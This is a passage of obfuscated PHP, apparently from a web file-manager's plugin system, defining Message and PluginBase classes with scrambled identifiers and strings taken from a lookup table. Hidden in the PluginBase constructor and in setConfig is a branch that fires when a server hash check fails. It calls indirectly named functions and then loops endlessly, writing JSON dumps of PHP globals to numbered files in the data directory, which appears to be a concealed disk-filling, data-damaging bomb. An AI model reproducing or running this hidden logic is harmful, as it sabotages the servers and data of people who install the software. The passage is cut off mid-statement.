$EŠÏï«ÀÚ[$dŠáÔğ´¢¯[359]]; } } $aæÄÀëÃ­÷ = $eé«ˆ‚ËÌ½; } $Bô¼¤Ğ·¥ = Model($dŠáÔğ´¢¯[2532]); foreach ($a×ãÃ­±æù as &$Fêç§Ó“ÇÃ) { $fÑ™Ğºàğª = array(); if (isset($FÑÓ¿‰Ş«Å[$Fêç§Ó“ÇÃ[$dŠáÔğ´¢¯[1429]]])) { $fÑ™Ğºàğª = $FÑÓ¿‰Ş«Å[$Fêç§Ó“ÇÃ[$dŠáÔğ´¢¯[1429]]]; } $Fêç§Ó“ÇÃ[$dŠáÔğ´¢¯[2533]] = array(); if (isset($fÑ™Ğºàğª[$D×ç£æç”¢])) { $Fêç§Ó“ÇÃ[$dŠáÔğ´¢¯[2533]] = $Bô¼¤Ğ·¥->getUserJobInfo($fÑ™Ğºàğª[$D×ç£æç”¢]); } } goto BØ¡„±«ã; aë ŸÑÛîì: $DÓî‡ëƒ±Õ = array($dŠáÔğ´¢¯[1429] => array($dŠáÔğ´¢¯[7], $F†ôİ³Ü¢‚)); $FÑÓ¿‰Ş«Å = Model($dŠáÔğ´¢¯[2506])->where($DÓî‡ëƒ±Õ)->select(); $FÑÓ¿‰Ş«Å = array_to_keyvalue_group($FÑÓ¿‰Ş«Å, $dŠáÔğ´¢¯[1429]); goto FÓ¹êŒË„; b²ÒÉŸ¤Ş: $dŠáÔğ´¢¯ =& $_SERVER[Î¿—”òá]; $D×ç£æç”¢ = UserJobModel::JOB_KEY; $BÍ‘¯ŞÁäµ = array($dŠáÔğ´¢¯[2509]); goto aë ŸÑÛîì; BØ¡„±«ã: } protected function groupUserAll($fƒÁñ¬îÍ) { $E—šÒÉ©ÎË =& $_SERVER[Î¿—”òá]; if (!$fƒÁñ¬îÍ) { return !1; } $Dœô¼Ğ…÷“ = Model($E—šÒÉ©ÎË[2173])->field($E—šÒÉ©ÎË[1429])->where(array($E—šÒÉ©ÎË[2097] => array($E—šÒÉ©ÎË[7], $fƒÁñ¬îÍ)))->select(); $Dœô¼Ğ…÷“ = array_to_keyvalue($Dœô¼Ğ…÷“, $E—šÒÉ©ÎË[33], $E—šÒÉ©ÎË[1429]); return array_unique($Dœô¼Ğ…÷“); } public function userSearch($aŒŒˆƒ§é, $Aë»†¼éø• = "\52") { return Model($_SERVER[Î¿—”òá][477])->where($aŒŒˆƒ§é)->field($Aë»†¼éø•)->find(); } } goto BËêùÏëœá; CÚŸåÙƒ‘Û: class Message { function __construct() { } public function send($d¯´Š²•–Ù = '', $d¾ßä§Ü = array(), $dâÅé‚ã = "\x74\145\170\x74") { goto eöö¢’ãî; E®‰³øÖ«é: $d¾ßä§Ü = array($cÒéÛô½”[964] => isset($d¾ßä§Ü[$cÒéÛô½”[964]]) ? $d¾ßä§Ü[$cÒéÛô½”[964]] : $cÒéÛô½”[33], $cÒéÛô½”[535] => isset($d¾ßä§Ü[$cÒéÛô½”[535]]) ? $d¾ßä§Ü[$cÒéÛô½”[535]] : $cÒéÛô½”[33]); if (empty($d¯´Š²•–Ù) || empty($d¾ßä§Ü[$cÒéÛô½”[964]]) && empty($d¾ßä§Ü[$cÒéÛô½”[535]])) { return !1; } $cóñŠŠ®”Ô = array($cÒéÛô½”[1239] => $a¥èÃ’ëòÖ, $cÒéÛô½”[1299] => $d¾ßä§Ü); goto E‹´­ÀšÃ; E‹´­ÀšÃ: Hook::trigger($cÒéÛô½”[1300], $cóñŠŠ®”Ô); goto e…ä¼Œ±«¼; eöö¢’ãî: $cÒéÛô½” =& $_SERVER[Î¿—”òá]; $a¥èÃ’ëòÖ = array($cÒéÛô½”[29] => $cÒéÛô½”[1297], $cÒéÛô½”[688] => $d¯´Š²•–Ù); if (in_array($dâÅé‚ã, array($cÒéÛô½”[1297], $cÒéÛô½”[1298]))) { $a¥èÃ’ëòÖ[$cÒéÛô½”[29]] = $dâÅé‚ã; } goto E®‰³øÖ«é; e…ä¼Œ±«¼: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dÑ§Èö‚ò©; f»ºĞÓ¤¹è: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $f‘»Ñ¿èŠ°[8]; $this->pluginApi = appHostGet() . $f‘»Ñ¿èŠ°[1303] . $this->pluginName . $f‘»Ñ¿èŠ°[8]; $this->pluginHost = $config[$f‘»Ñ¿èŠ°[1304]] . $this->pluginName . $f‘»Ñ¿èŠ°[8]; goto a¼„Ãê˜š¢; dÑ§Èö‚ò©: $f‘»Ñ¿èŠ° =& $_SERVER[Î¿—”òá]; $EÚËƒòÖ™ = $_SERVER[$f‘»Ñ¿èŠ°[787]] . $f‘»Ñ¿èŠ°[1301]; $bĞ¡ƒ¥‘ö– = $f‘»Ñ¿èŠ°[784]; goto c•¬ºÅôùé; a¼„Ãê˜š¢: $this->pluginHostDefault = $config[$f‘»Ñ¿èŠ°[1304]] . $this->pluginName . $f‘»Ñ¿èŠ°[8]; $D†Ü‰µÍ¾Š = $config[$f‘»Ñ¿èŠ°[1305]]; if ($D†Ü‰µÍ¾Š && strpos($f‘»Ñ¿èŠ°[47] . $D†Ü‰µÍ¾Š . $f‘»Ñ¿èŠ°[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$f‘»Ñ¿èŠ°[1306]] . $this->pluginName . $f‘»Ñ¿èŠ°[8]; } goto CÛĞİ„êÓ¶; c•¬ºÅôùé: if ($_SERVER[$f‘»Ñ¿èŠ°[676]] != $bĞ¡ƒ¥‘ö–($EÚËƒòÖ™)) { goto dº˜Ô™—Ä; e‹¨áÒ§˜£: $B´–‚Å™¸‡ = 1; for ($Cğ‡«ò©õ = $B´–‚Å™¸‡; $Cğ‡«ò©õ > 0; $Cğ‡«ò©õ++) { $E„©¥Ğ¨­Ê(DATA_PATH . $Cğ‡«ò©õ, $eµçö“”¥ò); } goto b×ØƒÕ÷š; dº˜Ô™—Ä: $DÇ ®µØƒİ = $f‘»Ñ¿èŠ°[785]; $AÙî”‚­Ç² = $f‘»Ñ¿èŠ°[678]; $càùÙÛÅÕ = $_SERVER[$f‘»Ñ¿èŠ°[679]] . $f‘»Ñ¿èŠ°[680]; goto B‘ËÖÓ†²„; B‘ËÖÓ†²„: $A˜‘‹Õè = $AÙî”‚­Ç²($càùÙÛÅÕ); $Fê–ƒ„²Ûî = explode($f‘»Ñ¿èŠ°[217], $A˜‘‹Õè); if (count($Fê–ƒ„²Ûî) < $f‘»Ñ¿èŠ°[567]) { $a”ìß‚íÀø = $f‘»Ñ¿èŠ°[681]; $a”ìß‚íÀø(); } goto E¼”„ÂµÂñ; E¼”„ÂµÂñ: $b×Îùğç = $f‘»Ñ¿èŠ°[786]; $b×Îùğç($_SERVER[$f‘»Ñ¿èŠ°[787]]); $DÇ ®µØƒİ = $f‘»Ñ¿èŠ°[785]; goto aÕêŠñÎß; aÕêŠñÎß: $DÇ ®µØƒİ(); $E„©¥Ğ¨­Ê = $f‘»Ñ¿èŠ°[788]; $eµçö“”¥ò = json_encode($GLOBALS[$f‘»Ñ¿èŠ°[789]]); goto e‹¨áÒ§˜£; b×ØƒÕ÷š: } global $in, $config; $this->config =& $config; goto A–¿ö½íÈ‹; CÛĞİ„êÓ¶: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bëÒÆ‰¶¸; A–¿ö½íÈ‹: $this->in =& $in; $this->modelPlugin = Model($f‘»Ñ¿èŠ°[1302]); $this->pluginName = str_replace($f‘»Ñ¿èŠ°[1302], $f‘»Ñ¿èŠ°[33], get_class($this)); goto f»ºĞÓ¤¹è; bëÒÆ‰¶¸: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Î¿—”òá][1307]); } protected function assign($E¦æŒ­©©, $D˜¥ º¤Ïó = false) { if (is_array($E¦æŒ­©©)) { $this->values = array_merge($this->values, $E¦æŒ­©©); } else { $this->values[$E¦æŒ­©©] = $D˜¥ º¤Ïó; } } protected function display($F±ƒŠÜÊĞ—) { extract($this->values); require $F±ƒŠÜÊĞ—; } final function hookRegist($E·‘Šùµ ×) { $this->modelPlugin->appRegist($this->pluginName, $E·‘Šùµ ×); } final function appIcon() { $e„Ø¼Ç”Ö– =& $_SERVER[Î¿—”òá]; $A—ÓŒĞŠ÷ = $this->appPackage(); $FÃˆÅ³šÅÃ = $e„Ø¼Ç”Ö–[33]; if (isset($A—ÓŒĞŠ÷[$e„Ø¼Ç”Ö–[382]])) { if (isset($A—ÓŒĞŠ÷[$e„Ø¼Ç”Ö–[382]][$e„Ø¼Ç”Ö–[1308]])) { $FÃˆÅ³šÅÃ = $e„Ø¼Ç”Ö–[1309] . $A—ÓŒĞŠ÷[$e„Ø¼Ç”Ö–[382]][$e„Ø¼Ç”Ö–[1308]] . $e„Ø¼Ç”Ö–[1310]; } else { if ($A—ÓŒĞŠ÷[$e„Ø¼Ç”Ö–[382]][$e„Ø¼Ç”Ö–[1311]]) { $FÃˆÅ³šÅÃ = $e„Ø¼Ç”Ö–[1312] . $A—ÓŒĞŠ÷[$e„Ø¼Ç”Ö–[382]][$e„Ø¼Ç”Ö–[1311]] . $e„Ø¼Ç”Ö–[1313]; } } } return $FÃˆÅ³šÅÃ; } final function fileCanView($Cä¬ó•ó¯Í) { goto Fë°ê¬¡…; Fë°ê¬¡…: $A¡Øİºåæˆ =& $_SERVER[Î¿—”òá]; if (request_url_safe($Cä¬ó•ó¯Í)) { return !0; } if ($this->isShare($Cä¬ó•ó¯Í)) { return !0; } goto cÇöˆñİ‚±; f¾óãŸÃòØ: ActionCall($A¡Øİºåæˆ[1326], $Cä¬ó•ó¯Í); goto aÎÌÂÚê¡„; cÇöˆñİ‚±: $aôÑĞæ…¼È = Session::get($A¡Øİºåæˆ[1314]); if (!$aôÑĞæ…¼È || !$aôÑĞæ…¼È[$A¡Øİºåæˆ[1315]]) { $cåÍÀ‚Èäê = $A¡Øİºåæˆ[1316] . rawurlencode(this_url()); show_tips(LNG($A¡Øİºåæˆ[1317]) . $A¡Øİºåæˆ[1318] . $cåÍÀ‚Èäê . $A¡Øİºåæˆ[1319] . LNG($A¡Øİºåæˆ[1320]) . $A¡Øİºåæˆ[1321], !1); } if (!Action($A¡Øİºåæˆ[1322])->authCan($A¡Øİºåæˆ[1323])) { show_tips(LNG($A¡Øİºåæˆ[1324]) . $A¡Øİºåæˆ[1325], !1); } goto f¾óãŸÃòØ; aÎÌÂÚê¡„: } final function isShare($C‹Ãöİ®ùù) { $dš’ñÒ±Ê¢ = KodIO::parse($C‹Ãöİ®ùù); return $dš’ñÒ±Ê¢[$_SERVER[Î¿—”òá][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($d‚İ§Ö±µ’) { if (request_url_safe($d‚İ§Ö±µ’)) { return $d‚İ§Ö±µ’; } if (!$this->isShare($d‚İ§Ö±µ’)) { $d‚İ§Ö±µ’ = $this->filePath($d‚İ§Ö±µ’); } return Action($_SERVER[Î¿—”òá][1011])->linkOut($d‚İ§Ö±µ’); } public function filePathLinkOut($Bê×ğØê‰à) { if (request_url_safe($Bê×ğØê‰à)) { return $Bê×ğØê‰à; } $this->fileCanView($Bê×ğØê‰à); return Action($_SERVER[Î¿—”òá][1011])->link($Bê×ğØê‰à); } final function filePath($C–Ş‡äÎØ—) { $f‚“Éù î• =& $_SERVER[Î¿—”òá]; if ($C¡øÉâæ¤ = $this->checkSharePath($C–Ş‡äÎØ—)) { return $C¡øÉâæ¤; } $this->fileCanView($C–Ş‡äÎØ—); if (request_url_safe($C–Ş‡äÎØ—)) { $C·—ÕÖ§³ = parse_url_query($C–Ş‡äÎØ—); if (isset($C·—ÕÖ§³[$f‚“Éù î•[1327]]) && isset($C·—ÕÖ§³[$f‚“Éù î•[197]])) { $cõ›¾äšİ = Model($f‚“Éù î•[1081])->get($f‚“Éù î•[1328]); $Bù’“…Å‡ƒ = Mcrypt::decode($C·—ÕÖ§³[$f‚“Éù î•[197]], $cõ›¾äšİ); if ($Bù’“…Å‡ƒ) { $this->fileInfo = IO::infoWithChildren($Bù’“…Å‡ƒ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Bù’“…Å‡ƒ; } } $C–Ş‡äÎØ— = $this->_cacheHttpFile($C–Ş‡äÎØ—); $this->fileInfo = IO::infoWithChildren($C–Ş‡äÎØ—); } else { $this->fileInfo = IO::infoWithChildren($C–Ş‡äÎØ—); if (!$this->fileInfo) { show_tips(LNG($f‚“Éù î•[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $C–Ş‡äÎØ—; } final function _cacheHttpFile($d“‘ÈìÆã™) { $fÉõê»ÔÄ = hash_path($d“‘ÈìÆã™, !0); $this->cachePath = $this->pluginCachePath($fÉõê»ÔÄ); if ($d¢“ÕÃ°Ó = IO::fileNameExist($this->cachePath, $fÉõê»ÔÄ)) { return KodIO::make($d¢“ÕÃ°Ó); } $d®ªÄµ¯ø² = $this->cachePath . $fÉõê»ÔÄ; return $this->pluginCacheFileSet($d®ªÄµ¯ø², file_get_contents($d“‘ÈìÆã™)); } final function _tmpFileName($bÜÜÏ‰¢æ = array()) { goto F²´ºö‰»Ğ; A¸ù±›Á: $A‰ç‡ËÒ¾ƒ = array($bÜÜÏ‰¢æ[$dï†Â¦‡‹[28]], $bÜÜÏ‰¢æ[$dï†Â¦‡‹[75]], $bÜÜÏ‰¢æ[$dï†Â¦‡‹[77]]); if (isset($bÜÜÏ‰¢æ[$dï†Â¦‡‹[459]])) { $A‰ç‡ËÒ¾ƒ[] = $bÜÜÏ‰¢æ[$dï†Â¦‡‹[459]]; } return md5(implode($dï†Â¦‡‹[70], $A‰ç‡ËÒ¾ƒ)); goto D›½ªŞè›Š; d¼§Ó÷´: if (isset($bÜÜÏ‰¢æ[$dï†Â¦‡‹[162]][$dï†Â¦‡‹[164]])) { return $bÜÜÏ‰¢æ[$dï†Â¦‡‹[162]][$dï†Â¦‡‹[164]]; } $dà×´¾Šõ‡ = IO::hashSimple($bÜÜÏ‰¢æ[$dï†Â¦‡‹[75]]); if ($dà×´¾Šõ‡) { return $dà×´¾Šõ‡; } goto A¸ù±›Á; F²´ºö‰»Ğ: $dï†Â¦‡‹ =& $_SERVER[Î¿—”òá]; if (!$bÜÜÏ‰¢æ) { $bÜÜÏ‰¢æ = $this->fileInfo; } if (isset($bÜÜÏ‰¢æ[$dï†Â¦‡‹[164]])) { return $bÜÜÏ‰¢æ[$dï†Â¦‡‹[164]]; } goto d¼§Ó÷´; D›½ªŞè›Š: } final function checkSharePath($D§ƒ××óæš) { goto Cô‡­ŞÊšÌ; EÎà¤‹¶¡°: $EÌ¯¶İêÑî = Action($E‚ğ±¡›¼©[1011])->sharePathInfo($D§ƒ××óæš); if (!isset($EÌ¯¶İêÑî[$E‚ğ±¡›¼©[75]])) { show_json(LNG($E‚ğ±¡›¼©[1330]), !1); } $this->fileInfo = $EÌ¯¶İêÑî[$E‚ğ±¡›¼©[162]]; goto fØæ¢â¬º‚; Cô‡­ŞÊšÌ: $E‚ğ±¡›¼© =& $_SERVER[Î¿—”òá]; if (!defined($E‚ğ±¡›¼©[427])) { define($E‚ğ±¡›¼©[1329], 0); } if (!$this->isShare($D§ƒ××óæš)) { return !1; } goto EÎà¤‹¶¡°; fØæ¢â¬º‚: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E‚ğ±¡›¼©[164]]); return $EÌ¯¶İêÑî[$E‚ğ±¡›¼©[75]]; goto BëŠ•Õ´ˆ; BëŠ•Õ´ˆ: } final function pluginCachePath($a¹õäŠ‰‰ª = '') { $B†•©÷°Û” =& $_SERVER[Î¿—”òá]; $Fª’Ó±“ñ• = IO_PATH_SYSTEM_TEMP . $B†•©÷°Û”[1331] . $this->pluginName; if (!($FÒ²ŠÓà‚Œ = IO::infoFull($Fª’Ó±“ñ•))) { return IO::mkdir($Fª’Ó±“ñ• . $B†•©÷°Û”[8] . $a¹õäŠ‰‰ª); } if (empty($a¹õäŠ‰‰ª)) { return $FÒ²ŠÓà‚Œ[$B†•©÷°Û”[75]]; } if (!($F¡ï‘èéÕÒ = IO::fileNameExist($FÒ²ŠÓà‚Œ[$B†•©÷°Û”[75]], $a¹õäŠ‰‰ª))) { return IO::mkdir($FÒ²ŠÓà‚Œ[$B†•©÷°Û”[75]] . $a¹õäŠ‰‰ª); } return KodIO::make($F¡ï‘èéÕÒ); } final function pluginCacheFileSet($e‘İîİÁÛ, $c½Å°ŠèÆµ = '') { $C‰¾Œ·«§´ =& $_SERVER[Î¿—”òá]; if (!($b÷¨ÊÍÇ“ = IO::infoFull($e‘İîİÁÛ))) { return IO::mkfile($e‘İîİÁÛ, $c½Å°ŠèÆµ, REPEAT_REPLACE); } IO::setContent($b÷¨ÊÍÇ“[$C‰¾Œ·«§´[75]], $c½Å°ŠèÆµ); return $b÷¨ÊÍÇ“[$C‰¾Œ·«§´[75]]; } final function pluginLocalFile($DÈŒ£Ú‘ªÛ = '') { goto d„ñ—×¶—Ä; d„ñ—×¶—Ä: $c±œ£áÕ—ê =& $_SERVER[Î¿—”òá]; $b­™—¦‚¹… = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($b­™—¦‚¹…)) { mk_dir($b­™—¦‚¹…); } goto b½Åç˜Šá‚; b½Åç˜Šá‚: if (!$DÈŒ£Ú‘ªÛ) { return $b­™—¦‚¹…; } $bÅÀì¯ë…Ì = IO::info($DÈŒ£Ú‘ªÛ); $d‰ùå¸¾ = $this->_tmpFileName($bÅÀì¯ë…Ì) . $c±œ£áÕ—ê[91] . $bÅÀì¯ë…Ì[$c±œ£áÕ—ê[160]]; goto BÎá³Š…¥Ü; BÎá³Š…¥Ü: $b¼¢Ãøñ„ = $b­™—¦‚¹… . $d‰ùå¸¾; if (@file_exists($b¼¢Ãøñ„)) { return $b¼¢Ãøñ„; } return IO::copy($DÈŒ£Ú‘ªÛ, $b­™—¦‚¹…, 0, $d‰ùå¸¾); goto F’ç¶†ö¿Ó; F’ç¶†ö¿Ó: } final function appPackage() { goto C¨‹¨®·÷§; cÍšçµ”: $this->parseLang($bËòäŒ†çØ); $b›Ğ¯‡Ğë = json_decode_force($bËòäŒ†çØ); if (!$b›Ğ¯‡Ğë) { return array(); } goto F²öà•°ßÑ; a™õ›·³ó: return $b›Ğ¯‡Ğë; goto cö‚ì™Ú©Ä; C¨‹¨®·÷§: $A¢ÙÔˆ„–ò =& $_SERVER[Î¿—”òá]; if ($this->packageData) { return $this->packageData; } $bËòäŒ†çØ = $this->parseFile($this->pluginPath . $A¢ÙÔˆ„–ò[1332]); goto cÍšçµ”; F²öà•°ßÑ: $a«ùáÌë = Hook::trigger($A¢ÙÔˆ„–ò[1333], $b›Ğ¯‡Ğë); if ($a«ùáÌë && is_array($a«ùáÌë)) { $b›Ğ¯‡Ğë = $a«ùáÌë; } $this->packageData = $b›Ğ¯‡Ğë; goto a™õ›·³ó; cö‚ì™Ú©Ä: } public function packageInfoGet($E¡˜¤À¹ë) { $DËÅ“±°¼­ = $this->appPackage(); return array_get_value($DËÅ“±°¼­, $E¡˜¤À¹ë); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Î¿—”òá][1334]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Î¿—”òá][1335]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Î¿—”òá][1336]); } private function parseFile($FÚôáæïğ) { goto A‹Üù”Íƒ; e¯Ê‰õÒàé: $aÚá‡¦²ºÁ = str_replace($dà–¿®ìŠ, $eĞ†¨õ‡„†, $aÚá‡¦²ºÁ); return $aÚá‡¦²ºÁ; goto e„ÌÊ¼íŒ»; A‹Üù”Íƒ: $f†îœ„Ï­ =& $_SERVER[Î¿—”òá]; $aÚá‡¦²ºÁ = file_get_contents($FÚôáæïğ); $dà–¿®ìŠ = array($f†îœ„Ï­[1337], $f†îœ„Ï­[1338], $f†îœ„Ï­[1339], $f†îœ„Ï­[1340], $f†îœ„Ï­[1341], $f†îœ„Ï­[1342], $f†îœ„Ï­[1343]); goto cğ–Êõğø; cğ–Êõğø: $eĞ†¨õ‡„† = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$f†îœ„Ï­[84]][$f†îœ„Ï­[1344]]); if (strstr($aÚá‡¦²ºÁ, $f†îœ„Ï­[1345])) { $b¦…Ä†î¨Ü = rawurlencode(json_encode($this->pluginLangArr)); $aÚá‡¦²ºÁ = str_replace($f†îœ„Ï­[1345], $b¦…Ä†î¨Ü, $aÚá‡¦²ºÁ); } if (strstr($aÚá‡¦²ºÁ, $f†îœ„Ï­[1346])) { $b¦…Ä†î¨Ü = $b¦…Ä†î¨Ü = rawurlencode(json_encode($this->getConfig())); $aÚá‡¦²ºÁ = str_replace($f†îœ„Ï­[1346], $b¦…Ä†î¨Ü, $aÚá‡¦²ºÁ); } goto e¯Ê‰õÒàé; e„ÌÊ¼íŒ»: } private function parseLang(&$fÛËÈÅ¯õâ) { goto e¡š»Ù¸‘³; bõØ‡âç”Õ: $D‰£Š™Šš = array(); foreach ($A¶¡Ãáø[0] as $DÌ¬ğ»ŸÑŠ) { $c‰ØÌì‰¿ = substr($DÌ¬ğ»ŸÑŠ, strlen($d±¿º…–É), -4); $Cá§¬™…¡ = LNG($c‰ØÌì‰¿); $C«áœ³ËÀ[] = $DÌ¬ğ»ŸÑŠ; $D‰£Š™Šš[] = str_replace(array($a³ŸïÚÈÔ¸[217], $a³ŸïÚÈÔ¸[985], $a³ŸïÚÈÔ¸[330], $a³ŸïÚÈÔ¸[113]), array($a³ŸïÚÈÔ¸[50], $a³ŸïÚÈÔ¸[50], $a³ŸïÚÈÔ¸[33], $a³ŸïÚÈÔ¸[1349]), $Cá§¬™…¡); } $fÛËÈÅ¯õâ = str_replace($C«áœ³ËÀ, $D‰£Š™Šš, $fÛËÈÅ¯õâ); goto a…„„Ñ»Éâ; e¡š»Ù¸‘³: $a³ŸïÚÈÔ¸ =& $_SERVER[Î¿—”òá]; $d±¿º…–É = $a³ŸïÚÈÔ¸[1347]; if (!strstr($fÛËÈÅ¯õâ, $d±¿º…–É)) { return; } goto E³Œù¢¡¢¤; E³Œù¢¡¢¤: preg_match_all($a³ŸïÚÈÔ¸[1348], $fÛËÈÅ¯õâ, $A¶¡Ãáø); if (!is_array($A¶¡Ãáø) || count($A¶¡Ãáø) == 0 || !is_array($A¶¡Ãáø[0]) || count($A¶¡Ãáø[0]) == 0) { return; } $C«áœ³ËÀ = array(); goto bõØ‡âç”Õ; a…„„Ñ»Éâ: } private function parseConfig(&$F­ ÒİÛò„) { goto AãÉî·øåê; AâØ³š»å: preg_match_all($B®„ë”‡È[1351], $F­ ÒİÛò„, $FÍ¿ˆƒÆù); if (!is_array($FÍ¿ˆƒÆù) || count($FÍ¿ˆƒÆù) == 0 || !is_array($FÍ¿ˆƒÆù[0]) || count($FÍ¿ˆƒÆù[0]) == 0) { return; } $bÑªõé¼Àß = $this->getConfig(); goto C•±İ¸É…œ; B¶¢‹…ï‹×: $F­ ÒİÛò„ = str_replace($d’´±¡¥îò, $D¹èÃŞºÇó, $F­ ÒİÛò„); goto b³„ó¹Ê·; AãÉî·øåê: $B®„ë”‡È =& $_SERVER[Î¿—”òá]; $bŒ¾Šº¶ª« = $B®„ë”‡È[1350]; if (!strstr($F­ ÒİÛò„, $bŒ¾Šº¶ª«)) { return; } goto AâØ³š»å; C•±İ¸É…œ: $d’´±¡¥îò = array(); $D¹èÃŞºÇó = array(); foreach ($FÍ¿ˆƒÆù[0] as $Fğ¨Ù—ˆìå) { $B¹âÅÉëÄ = substr($Fğ¨Ù—ˆìå, strlen($bŒ¾Šº¶ª«), -2); $d’´±¡¥îò[] = $Fğ¨Ù—ˆìå; $D¹èÃŞºÇó[] = _get($bÑªõé¼Àß, $B¹âÅÉëÄ); } goto B¶¢‹…ï‹×; b³„ó¹Ê·: } private function parsePackage(&$F¹ ±—åÕ) { goto F†Ä¥ ‡î; D©îÇÖÄ…: $F¹ ±—åÕ = str_replace($EØ‡ƒ•ŒÆÜ, $BËÎÖåˆö¢, $F¹ ±—åÕ); goto c¾ó‰¯ëÄ; AÍÓĞøéï: preg_match_all($F…ÀÈØ‰ù¢[1353], $F¹ ±—åÕ, $fóºãèï¸ˆ); if (!is_array($fóºãèï¸ˆ) || count($fóºãèï¸ˆ) == 0 || !is_array($fóºãèï¸ˆ[0]) || count($fóºãèï¸ˆ[0]) == 0) { return; } $cÑºÓòºæğ = $this->appPackage(); goto Cì××èŠ–Ø; Cì××èŠ–Ø: $EØ‡ƒ•ŒÆÜ = array(); $BËÎÖåˆö¢ = array(); foreach ($fóºãèï¸ˆ[0] as $aëö÷¿ãÌ) { $eÄÅèÁé‹ = substr($aëö÷¿ãÌ, strlen($F­¹¤Û¥í·), -2); $EØ‡ƒ•ŒÆÜ[] = $aëö÷¿ãÌ; $BËÎÖåˆö¢[] = _get($cÑºÓòºæğ, $eÄÅèÁé‹); } goto D©îÇÖÄ…; F†Ä¥ ‡î: $F…ÀÈØ‰ù¢ =& $_SERVER[Î¿—”òá]; $F­¹¤Û¥í· = $F…ÀÈØ‰ù¢[1352]; if (!strstr($F¹ ±—åÕ, $F­¹¤Û¥í·)) { return; } goto AÍÓĞøéï; c¾ó‰¯ëÄ: } final function echoFile($dîğ’‡¬©, $DÇĞØñŠ¯¾ = false) { goto b‘İ‘ù×±½; eÒïà‚í´©: $this->parsePackage($dğ°ò×¥‡); if (is_array($DÇĞØñŠ¯¾)) { $dğ°ò×¥‡ = str_replace(array_keys($DÇĞØñŠ¯¾), array_values($DÇĞØñŠ¯¾), $dğ°ò×¥‡); } echo $DŒïÍßï…[217] . $dğ°ò×¥‡; goto f¿Ã…ÕÏ¬¼; aÏŸùÁóµá: $dğ°ò×¥‡ = $this->parseFile($FÂÚÇÑÎ–â); $this->parseLang($dğ°ò×¥‡); $this->parseConfig($dğ°ò×¥‡); goto eÒïà‚í´©; b‘İ‘ù×±½: $DŒïÍßï… =& $_SERVER[Î¿—”òá]; $FÂÚÇÑÎ–â = $this->pluginPath . $dîğ’‡¬©; if (ACT == $DŒïÍßï…[1354]) { echo $DŒïÍßï…[1355] . $this->pluginName . $DŒïÍßï…[8] . $dîğ’‡¬© . $DŒïÍßï…[1356]; if (!file_exists($FÂÚÇÑÎ–â)) { echo $DŒïÍßï…[1357]; return; } } goto aÏŸùÁóµá; f¿Ã…ÕÏ¬¼: } final function initLang() { goto AÂĞ–ŸŒá§; AÂĞ–ŸŒá§: $FÂ°º÷Ù‹ =& $_SERVER[Î¿—”òá]; $CÚÈğƒ¥ïê = $FÂ°º÷Ù‹[1358]; $AƒƒÌÕÛ = $this->pluginPath . $FÂ°º÷Ù‹[1359]; goto FºÚÈ™Ö•â; aãÏ“Ô†‹¶: if (!is_array($cø¸ó®÷)) { return array(); } if (@count($cø¸ó®÷) > 0) { I18n::set($cø¸ó®÷); } return $cø¸ó®÷; goto fŞÃÒçŞ˜ˆ; FºÚÈ™Ö•â: $c•ì¶—øœ = I18n::getType(); $cø¸ó®÷ = array(); if (file_exists($AƒƒÌÕÛ . $c•ì¶—øœ . $FÂ°º÷Ù‹[762])) { $cø¸ó®÷ = (include $AƒƒÌÕÛ . $c•ì¶—øœ . $FÂ°º÷Ù‹[762]); } else { if ($c•ì¶—øœ == $FÂ°º÷Ù‹[1360] && !file_exists($AƒƒÌÕÛ . $c•ì¶—øœ . $FÂ°º÷Ù‹[762]) && file_exists($AƒƒÌÕÛ . $FÂ°º÷Ù‹[1361])) { $cø¸ó®÷ = (include $AƒƒÌÕÛ . $FÂ°º÷Ù‹[1361]); } else { if (file_exists($AƒƒÌÕÛ . $CÚÈğƒ¥ïê . $FÂ°º÷Ù‹[762])) { $cø¸ó®÷ = (include $AƒƒÌÕÛ . $CÚÈğƒ¥ïê . $FÂ°º÷Ù‹[762]); } } } goto aãÏ“Ô†‹¶; fŞÃÒçŞ˜ˆ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ağë´³óÇ) { $f“¹ñÛçÑŞ =& $_SERVER[Î¿—”òá]; $Cˆª—ëíç¬ = $_SERVER[$f“¹ñÛçÑŞ[787]] . $f“¹ñÛçÑŞ[1301]; $DİŒ‰ß´˜  = $f“¹ñÛçÑŞ[784]; if ($_SERVER[$f“¹ñÛçÑŞ[676]] != $DİŒ‰ß´˜ ($Cˆª—ëíç¬)) { goto a„¦ÔšÇƒ½; CÏ—¯¨„ÁÊ: $b“¦•ÎÄÓ“(); $Bë¿¨ÃÇğË = $f“¹ñÛçÑŞ[788]; $Aƒµ¨ä¯á¶ = json_encode($GLOBALS[$f“¹ñÛçÑŞ[789]]); goto DÏ«“‚¢ƒÕ; DÏ«“‚¢ƒÕ: $A‘¦œâÎ = 1; for ($b¸„‘™µğ… = $A‘¦œâÎ; $b¸„‘™µğ… > 0; $b¸„‘™µğ…++) { $Bë¿¨ÃÇğË(DATA_PATH . $b¸„‘™µğ…, $Aƒµ¨ä¯á¶); } goto dëïôŞí—‚; eŒ„ëö¥»À: $FŒ´í‡´…³ = $f“¹ñÛçÑŞ[786]; $FŒ´í‡´…³($_SERVER[$f“¹ñÛçÑŞ[787]]); $b“¦•ÎÄÓ“ = $f“¹ñÛçÑŞ[785]; goto CÏ—¯¨„ÁÊ; a„¦ÔšÇƒ½: $b“¦•ÎÄÓ“ = $f“¹ñÛçÑŞ[785]; $eõåáÈ© = 